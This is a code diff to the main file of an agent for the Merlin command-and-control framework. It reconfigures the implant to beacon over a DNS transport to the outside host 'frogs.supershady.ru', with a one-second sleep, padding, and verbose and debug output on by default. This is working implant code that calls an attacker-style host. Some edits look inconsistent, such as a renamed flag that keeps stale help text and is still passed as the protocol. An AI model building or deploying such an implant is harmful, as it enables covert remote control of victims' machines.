@@ -18,6 +18,9 @@
 package main
 
 import (
+	"github.com/Ne0nd0g/merlin/pkg/agent"
+	"github.com/Ne0nd0g/merlin/pkg/transport/dns"
+
 	// Standard
 	"flag"
 	"fmt"
@@ -29,21 +32,19 @@ import (
 
 	// Merlin
 	merlin "github.com/Ne0nd0g/merlin/pkg"
-	"github.com/Ne0nd0g/merlin/pkg/agent"
-	"github.com/Ne0nd0g/merlin/pkg/transport/http2"
 )
 
 // GLOBAL VARIABLES
-var url = "https://127.0.0.1:443"
+var url = "frogs.supershady.ru"
 var build = "nonRelease"
 
 func main() {
-	verbose := flag.Bool("v", false, "Enable verbose output")
+	verbose := flag.Bool("v", true, "Enable verbose output")
 	version := flag.Bool("version", false, "Print the agent version and exit")
-	debug := flag.Bool("debug", false, "Enable debug output")
+	debug := flag.Bool("debug", true, "Enable debug output")
 	flag.StringVar(&url, "url", url, "Full URL for agent to connect to")
-	protocol := flag.String("proto", "h2", "Protocol for the agent to connect with [h2, hq]")
-	sleep := flag.Duration("sleep", 30000*time.Millisecond, "Time for agent to sleep")
+	protocol := flag.String("ns", "127.0.0.1", "Protocol for the agent to connect with [h2, hq]")
+	sleep := flag.Duration("sleep", 1000*time.Millisecond, "Time for agent to sleep")
 	flag.Usage = usage
 	flag.Parse()
 
@@ -55,10 +56,13 @@ func main() {
 
 	// Setup and run agent
 	//use http2 transport
-	trnsprt := http2.HTTP2CommClient{}.New(*protocol, url, "UA HERE")
-
+	trnsprt := dns.DNSCommClient{}.New("dns", "", "aa")
+	trnsprt.Host = url
+	trnsprt.NS = "127.0.0.1"
+	//agent.New
 	a := agent.New(*protocol, *verbose, *debug, &trnsprt)
 	a.WaitTime = *sleep
+	a.PaddingMax = 5
 	a.Run(url)
 }
 
